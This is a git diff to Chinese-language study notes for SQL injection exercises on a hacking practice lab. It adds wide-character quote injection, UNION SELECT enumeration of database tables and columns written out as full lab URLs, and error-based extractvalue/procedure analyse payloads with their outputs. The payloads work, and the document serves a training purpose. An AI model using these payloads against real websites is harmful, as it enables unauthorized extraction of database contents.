@@ -14,9 +14,91 @@ category:
 
 <!-- more -->
 
+
 # 练习网站
 
 [网络信息安全攻防学习平台](http://hackinglab.cn/index.php)
+
+## 防注入
+
+	利用宽字符将`'`注入
+
+	判断列
+	order by 4
+
+	判断显示位
+	union all select 1,2,3,4
+
+
+	查询语句
+	union all select 1,user(),3,4  用户
+	database()数据库
+	version()版本
+
+
+可以利用python的包来作相关处理，比如：
+查看特殊字符url转义。
+```
+In [30]: import urllib
+In [30]: urllib.quote('\'')
+Out[30]: '%27'
+In [31]: urllib.unquote('%23')
+Out[31]: '#'
+```
+
+转换字符串为二进制并用十六进制表示
+```
+In [33]: import binascii
+
+In [34]: binascii.hexlify('mydbs')
+Out[34]: '6d79646273'
+```
+
+查数据库表
+```
+http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+table_name)),3%20%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23
+```
+
+	sae_user_sqli4
+
+查表中对应的字段
+```
+http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+column_name)),3%20%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%23
+```
+
+	id,title_1,content_1
+
+## 到底能不能回显
+
+关于`limit`命令的注入。
+
+得到数据库名称：
+```
+procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, schema_name ,0x7e) from information_schema.schemata))),1)%23&num=1
+```
+
+	XPATH syntax error: ':~information_schema~,~mydbs~,~t' 
+
+`mydbs` 0x6d79646273
+
+procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=0x6d79646273 ))),1)%23&num=1
+
+	XPATH syntax error: ':~article~,~user~' 
+
+得到table name:
+
+```
+procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=database() limit 1,1))),1)%23&num=1
+```
+
+`user`二级制`0x75736572`
+
+```
+procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 ))),1)%23&num=1
+```
+
+
+## 7题
 
 //看数据库版本 5.1.73
 ```
@@ -126,4 +208,5 @@ got it.拿到用户名密码后登录即可。
 ```
 
 ## 参考网站
-[1] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
+[1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
+[2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
